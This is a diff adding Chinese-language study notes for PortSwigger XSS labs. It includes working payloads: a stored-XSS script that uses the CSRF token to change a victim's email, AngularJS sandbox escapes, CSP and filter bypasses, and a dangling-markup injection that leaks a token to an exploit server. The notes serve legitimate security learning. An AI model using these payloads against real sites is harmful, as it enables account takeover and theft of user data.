@@ -1,6 +1,8 @@
 ---
 title: PortSwigger Cross-site scripting
 description: PortSwigger Cross-site scripting
+last_update:
+  date: "2025-08-10T08:00:00+08:00"
 ---
 
 ## Lab: Reflected XSS into HTML context with nothing encoded
@@ -419,10 +421,12 @@ https://0a7c009b044d931980202bbf0062009c.web-security-academy.net/?search=%3Cdi%
 
 ```html
 <html>
-  <meta
-    http-equiv="refresh"
-    content="0; url=https://0a7c009b044d931980202bbf0062009c.web-security-academy.net/?search=%3Cdi%20onfocus%3D%22alert(document.cookie)%22%20tabindex%3D0%20autofocus%3E%3C%2Fdi%3E"
-  />
+  <head>
+    <meta
+      http-equiv="refresh"
+      content="0; url=https://0a7c009b044d931980202bbf0062009c.web-security-academy.net/?search=%3Cdi%20onfocus%3D%22alert(document.cookie)%22%20tabindex%3D0%20autofocus%3E%3C%2Fdi%3E"
+    />
+  </head>
 </html>
 ```
 
@@ -522,7 +526,37 @@ for (const onEvent of onEvents) {
 | Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes |
 | Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag     |
 
-<!-- todo-yusheng -->
+透過瀏覽器 F12 > Network > Doc 觀察 Response Body
+
+<!-- prettier-ignore -->
+```html
+<link rel="canonical" href='https://0acf009b036572748111259b000f00d9.web-security-academy.net/'/>
+```
+
+記住，因為瀏覽器 parsing DOM 的機制，所以不能看 F12 > Element，一定要看 Response Body 原始傳輸的 HTML
+
+我們可以嘗試注入單引號來跳脫，並且注意不要注入空白，因為在網址列會被 encode 成 `%20`，加上 attribute 之間其實也不一定要空白
+
+<!-- prettier-ignore -->
+```
+?query='accesskey='x'onclick='alert(1)
+```
+
+最終會產生
+
+<!-- prettier-ignore -->
+```html
+<link rel="canonical" href='https://0acf009b036572748111259b000f00d9.web-security-academy.net/?query='accesskey='x'onclick='alert(1)'/>
+```
+
+這題卡了約 15 分鐘，我一開始看 F12 > Element 是
+
+<!-- prettier-ignore -->
+```html
+<link rel="canonical" href="https://0acf009b036572748111259b000f00d9.web-security-academy.net/"/>
+```
+
+所以我以為要注入雙引號，瘋狂嘗試很久都無解，後來看了 F12 > Network > Doc 觀察 Response Body 才發現原來是要注入單引號！算是學到一個新知識，不能只相信 F12 > Element，因為那是 瀏覽器 parsing DOM 之後的結果
 
 ## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
 
@@ -846,6 +880,30 @@ fetch(
 | Document  | https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-bypass-csrf-protections |
 | Lab       | https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf                                           |
 
+1. 找到 Comment 欄位沒有防護，可注入 `<script>`
+2. 找到 CRSF Token 是在 `<input required="" type="hidden" name="csrf" value="p53YpGIoVu9mrEgUwXDkQOpCi1AyxfcT">`
+3. 把更改 email 的 request 複製下來，貼到留言內容
+
+```html
+<script>
+  addEventListener("DOMContentLoaded", () => {
+    const csrf = document.querySelector("input[name='csrf']").value;
+    fetch(
+      "https://0a7800ad0434f44480a6945e0099000d.web-security-academy.net/my-account/change-email",
+      {
+        headers: {
+          "content-type": "application/x-www-form-urlencoded",
+        },
+        body: `email=hacked${new Date().toISOString()}%40normal-user.net&csrf=${csrf}`,
+        method: "POST",
+        mode: "cors",
+        credentials: "include",
+      },
+    );
+  });
+</script>
+```
+
 ## Lab: Reflected XSS with AngularJS sandbox escape without strings
 
 | Dimension | Description                                                                                                                                  |
@@ -853,7 +911,118 @@ fetch(
 | Document  | https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection                                            |
 | Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings |
 
-<!-- todo-yusheng -->
+這題稍微難，因為我對 AngularJS 這個老技術很不熟悉，雖然以前待過的某間公司有用這個技術，但大部分的人都覺得這是燙手山芋，基本上同事(React 前端工程師)們，沒人認真去研究它XD
+
+我們有的工具包如下：
+
+| Malicious JavaScript                                     | Description                                                                                   |
+| -------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
+| `'a'.constructor.prototype.charAt=[].join`               | Modify `String.prototype.charAt`                                                              |
+| `$eval('x=alert(1)')`                                    | AngularJS's `$eval`, use assignment cause AngularJS think it's safe                           |
+| `'a'.constructor.fromCharCode()`                         | Generate " or ' to bypass the restriction of using " and ' directly                           |
+| `constructor.constructor('alert("XSS")')()`              | `constructor.constructor === Function`, `Function('alert("XSS")')()` will execute immediately |
+| `[123]\|orderBy:constructor.constructor('x=alert(1)')()` | `orderBy` is a alternative of `$eval` that can execute expression if `$eval` is not available |
+
+觀察網站有以下 html
+
+<!-- prettier-ignore -->
+```html
+<script>
+angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+    $scope.query = {};
+    var key = 'search';
+    $scope.query[key] = '123';
+    $scope.value = $parse(key)($scope.query);
+});
+</script>
+<h1 ng-controller="vulnCtrl" class="ng-scope ng-binding">0 search results for 123</h1>
+```
+
+這題實在太難，我對 AngularJS 的機制完全不熟，所以直接參考答案
+
+<!-- prettier-ignore -->
+```
+https://0a8e00220480a2e880200325008600b8.web-security-academy.net/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+```
+
+這題我測出來的限制是
+
+1. `'` 會被轉譯成 `&apos;`
+2. search 總長度 120 字以內
+3. `?search=1&x=3` 會產生以下 html，這點很重要，代表我們可以控制 `$scope.query[key]` 的 `key`
+
+<!-- prettier-ignore -->
+```html
+<script>
+angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+    $scope.query = {};
+    var key = 'search';
+    $scope.query[key] = '1';
+    $scope.value = $parse(key)($scope.query);
+    var key = 'x';
+    $scope.query[key] = '3';
+    $scope.value = $parse(key)($scope.query);
+});
+</script>
+<h1 ng-controller="vulnCtrl" class="ng-scope ng-binding">3 search results for 3</h1>
+```
+
+這個 payload 的分析如下
+
+1. `1&` 是因為要讓這段趕快跳過
+<!-- prettier-ignore -->
+
+```js
+var key = "search";
+$scope.query[key] = "1";
+```
+
+2. `toString()` => `'[object Undefined]'`，讓我們可以不用透過 `''` 的方式來創建字串
+3. `''.constructor.prototype.charAt=[].join` 前面的工具包有介紹到
+4. `''.fromCharCode(120,61,97,108,101,114,116,40,49,41)` 前面的工具包有介紹到
+
+這題是真的精妙，我從來沒想過可以用 `toString()` 的方式來構建字串，學習了
+
+## Lab: Reflected XSS with AngularJS sandbox escape and CSP
+
+| Dimension | Description                                                                                                                             |
+| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-csp-bypass-work |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp    |
+
+我們有的工具包如下：
+
+| Malicious JavaScript                                                                 | Description                                                                                                                         |
+| ------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
+| `<input autofocus ng-focus="$event.path\|orderBy:'[].constructor.from([1],alert)'">` | `$event.path` contains an array of DOM objects which also contains the window object as the last element before Chrome 109          |
+| `<input autofocus ng-focus=$event.composedPath()\|orderBy:'(y=alert)(1)'>`           | `$event.composedPath()` contains an array of DOM objects which also contains the window object as the last element after Chrome 109 |
+| `[1].map(alert)`                                                                     | Use `alert` as callback function                                                                                                    |
+| `[alert].pop()(1)`                                                                   | `[alert].pop() === alert`                                                                                                           |
+| `(y=alert)(1)`                                                                       | Use assignment cause AngularJS think it's safe                                                                                      |
+
+1. 注入 `{{ 1 }}`，看到結果是 `0 search results for '1'`，代表 AngularJS expression `{{}}` 可以成功注入～
+2. 注入 `{{ $event.path }}`，結果是 `0 search results for ''`
+3. 注入 `{{ $event.composedPath() }}`，結果是 `0 search results for ''`
+4. 注入很長的字串，結果是 `"Search term cannot exceed 80 characters"`
+5. 注入 `{{ [1].map(alert) }}`，看到錯誤訊息 `TypeError: undefined is not a function`
+6. 注入 `{{ <div>123</div> }}`，看到 `<div>123</div>` 成功變成 DOM
+7. 注入 `{{ <input ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'> }}`，可成功在 focus 執行 `alert(1)`
+8. 注入 `{{<input ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>}}`，可成功在 focus 執行 `alert`，但無法自行 focus
+
+研究到這邊，已知知道注入方向，但無法限制在 80 字內，所以後來參考答案，不得不說真的厲害
+
+9. 注入 `<div></div>`，看到 `<div></div>` 成功變成 DOM，代表不用 `{{}}` 也可以
+10. 注入 `<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>`
+11. 在 exploit-server 輸入
+<!-- prettier-ignore -->
+
+```html
+<script>
+  location.href = `https://0aa8003304121a7482df06a900fb009e.web-security-academy.net/?search=${encodeURIComponent("<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>")}#x`;
+</script>
+```
+
+這題由於限制 80 字，如果用 `<input autofocus` 會超過，所以答案是用 `<input id=x`，搭配在網址的 hash 加上 `#x`，真的是很聰明的做法～
 
 ## Lab: Reflected XSS with event handlers and `href` attributes blocked
 
@@ -862,7 +1031,179 @@ fetch(
 | Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags                          |
 | Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked |
 
-<!-- todo-yusheng -->
+題目已有給提示
+
+1. onEvent 都不能用
+2. href 不能用
+
+實測看看哪些 tag 能用
+
+```js
+const tags = `a
+a2
+abbr
+acronym
+address
+applet
+area
+article
+aside
+audio
+audio2
+b
+bdi
+bdo
+big
+blink
+blockquote
+body
+br
+button
+canvas
+caption
+center
+cite
+code
+col
+colgroup
+command
+content
+custom tags
+data
+datalist
+dd
+del
+details
+dfn
+dialog
+dir
+div
+dl
+dt
+element
+em
+embed
+fieldset
+figcaption
+figure
+font
+footer
+form
+frame
+frameset
+h1
+head
+header
+hgroup
+hr
+html
+i
+iframe
+iframe2
+image
+img
+input
+input2
+input3
+input4
+ins
+kbd
+keygen
+label
+legend
+li
+link
+listing
+main
+map
+mark
+marquee
+menu
+menuitem
+meta
+meter
+multicol
+nav
+nextid
+nobr
+noembed
+noframes
+noscript
+object
+ol
+optgroup
+option
+output
+p
+param
+picture
+plaintext
+pre
+progress
+q
+rb
+rp
+rt
+rtc
+ruby
+s
+samp
+script
+section
+select
+shadow
+slot
+small
+source
+spacer
+span
+strike
+strong
+style
+sub
+summary
+sup
+svg
+table
+tbody
+td
+template
+textarea
+tfoot
+th
+thead
+time
+title
+tr
+track
+tt
+u
+ul
+var
+video
+video2
+wbr
+xmp`.split("\n");
+async function test() {
+  for (const tag of tags) {
+    const html = `<${tag}>Click me</${tag}>`;
+    const res = await fetch(
+      `${location.origin}/?search=${encodeURIComponent(html)}`,
+    );
+    console.log({ onevent, status: res.status });
+  }
+}
+test();
+```
+
+最終得出 `a`, `image`, `svg`, `title`
+
+這題後來也是投降，參考解答，給出的 payload 讓我又學到 `<animate attributeName="href" values="javascript:alert(1)" />` 這個新東西了～
+
+<!-- prettier-ignore -->
+```html
+<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text x=20 y=20>Click me</text></a></svg>
+```
 
 ## Lab: Reflected XSS in a JavaScript URL with some characters blocked
 
@@ -871,7 +1212,40 @@ fetch(
 | Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string        |
 | Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked |
 
+我們有的工具包如下：
+
+| Malicious JavaScript                          | Description                                                                           |
+| --------------------------------------------- | ------------------------------------------------------------------------------------- |
+| `onerror=alert;throw 1`                       | `alert(1)` without using ( and )                                                      |
+| `<script>onerror=alert;throw 1337</script>`   | Set `onerror` event on window, `alert(1337)` without using `(` and `)`                |
+| `<script>{onerror=alert}throw 1337</script>`  | Set `onerror` event on window, `alert(1337)` without using `(`, `)` and `;`           |
+| `<script>throw onerror=alert,'haha'</script>` | Set `onerror` event on window, `alert(1337)` without using `(`, `)`, `{`, `}` and `;` |
+
+這題的注入點在這裡
+
+<!-- prettier-ignore -->
+```html
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>
+```
+
+想像上 `https://0a6b009f032d58a280cf0da400440021.web-security-academy.net/post?postId=1` 到這邊都是必備的
+
+這題也是妖魔鬼怪，看了答案也是看不懂的那種
+
+```
+https://0a6b009f032d58a280cf0da400440021.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+```
+
+會產生以下 html
+
+<!-- prettier-ignore -->
+```html
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ => window.location = '/')">Back to Blog</a>
+```
+
 <!-- todo-yusheng -->
+
+恩...實在是看不懂，我覺得這題有空再回來看吧
 
 ## Reflected XSS protected by very strict CSP, with dangling markup attack
 
@@ -880,7 +1254,46 @@ fetch(
 | Document  | https://portswigger.net/web-security/cross-site-scripting/dangling-markup#what-is-dangling-markup-injection<br/>https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp |
 | Lab       | https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack                                                                                                  |
 
-<!-- todo-yusheng -->
+首先找到注入點在 email，構造 `https://0ae3008003f8b14f82331a680010000c.web-security-academy.net/my-account?email=123`，會產生以下 html
+
+<!-- prettier-ignore -->
+```html
+<input required type="email" name="email" value="123">
+```
+
+嘗試關閉標籤，構造 `https://0ae3008003f8b14f82331a680010000c.web-security-academy.net/my-account?email=123"/><img src="https://www.google.com`，會產生以下 html
+
+<!-- prettier-ignore -->
+```html
+<input required="" type="email" name="email" value="123">
+<img src="https://www.google.com">
+```
+
+看一下網站的 CSP
+
+<!-- prettier-ignore -->
+```
+content-security-policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
+```
+
+這題的重點是要注入 `123"/><a href="https://exploit-0a91000904b1726d809507f0011000e3.exploit-server.net/">Click Me</a><base target='`，讓 html 結構變成以下
+
+<!-- prettier-ignore -->
+```html
+<input required="" type="email" name="email" value="123">
+<a href="https://exploit-0a91000904b1726d809507f0011000e3.exploit-server.net/">Click Me</a>
+<base target='">
+                            <input required type="hidden" name="csrf" value="wkxoIiRnkTeOOKgcuHeTTeXaKwFUGU4Q">
+                            <button class='
+```
+
+但我實測在 Chrome 139，這個方法已經不管用，另開新頁的 `window.name` 只會拿到空字串，所以這題應該沒辦法解了
+
+後來查詢了 PortSwigger 的相關文章，找到 [Bypassing CSP with dangling iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)，裡面就有說到
+
+Our Web Security Academy has a topic on [dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) - a technique for exploiting sites protected by [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy). But something interesting happened when we came to update to Chrome 97 - because one of our interactive labs mysteriously stopped working. When we originally made this lab, Chrome prevented dangling markup-based attacks by looking for raw whitespace followed by `"<"` characters - but forgot to prevent background attributes (as discovered by [Masato Kinugawa](https://twitter.com/kinugawamasato)).
+
+Unfortunately, from Chrome 97 this technique no longer worked, so I was tasked to try and find an alternative.
 
 ## Lab: Reflected XSS protected by CSP, with CSP bypass
 
@@ -889,7 +1302,48 @@ fetch(
 | Document  | https://portswigger.net/web-security/cross-site-scripting/content-security-policy#bypassing-csp-with-policy-injection |
 | Lab       | https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass                      |
 
-<!-- todo-yusheng -->
+[script-src-elem](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src-elem) 是我第一次聽到的 CSP，以前沒有用過，感覺應該找時間把 [CSP 的文章](../http/content-security-policy-1.md) 寫一寫了XD
+
+先觀察網站的 Respone Headers 設定的 CSP
+
+```
+content-security-policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+```
+
+嘗試在搜尋框輸入 `<script>alert(1)</script>`，可成功注入，但會被 CSP 擋住
+
+```
+Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.
+```
+
+後來看了 [Bypassing CSP with policy injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)，我覺得這題一定跟這個有關，於是嘗試
+
+```
+https://0a98004004c30aae80f921b300df004e.web-security-academy.net/?token=123
+```
+
+成功讓 CSP 變成
+
+```
+content-security-policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=123
+```
+
+接著就是直接注入 `token=123; script-src-attr 'unsafe-inline'&search=<input autofocus onfocus=alert(1) />`，整個 URL 變成
+
+<!-- prettier-ignore -->
+```
+https://0a98004004c30aae80f921b300df004e.web-security-academy.net/?token=123;%20script-src-attr%20%27unsafe-inline%27&search=%3Cinput%20autofocus%20onfocus=alert(1)%20/%3E
+```
+
+這題算是 expert 當中蠻簡單的題目XD
+
+## 小結
+
+本來以為我在實戰中有找過蠻多 XSS 的漏洞，解 XSS 系列的題目應該會比較簡單，結果我還是太高估自己了...在這 30 題的過程，其實我也學到蠻多新的攻擊手法，也看了大神寫的文章，每每看到新的攻擊手法，就會覺得很讚嘆，怎麼有人這麼聰明，可以想到這些解法啊！總而言之，花了大概 2 ~ 3 天的時間把 XSS 系列的題目解完，覺得是收穫滿滿，也讓我再次意識到自己的渺小。繼續往下一個主題邁進吧！
+
+但不得不說，最後 6 題 EXPERT 等級的，是真的蠻難的！題目不會很明確的跟你說是哪個頁面的哪個功能有 XSS 漏洞，所以需要花一點時間去研究，但 PRACTITIONER 等級的就比較親民，基本上跟著文章還有題目的介紹，都算是可以快速的定位 XSS 漏洞的注入點。這也是我覺得實戰跟刷題不一樣的地方，實戰會需要自行尋找可能的 XSS 漏洞注入點，並且利用已知的攻擊手法去測試，但刷題的話，我覺得概念會比較像是學習新的攻擊手法，即便沒有解出來也沒關係，有學到就好～
+
+蠻開心能在累積一些實戰經驗後再來刷題，感覺跟當初在學習 [SQL Injection](../web-security/port-swigger-sql-injection.md) 的時候不一樣，有一點基礎再來解題，會看到不一樣的世界。
 
 ## 參考資料
 
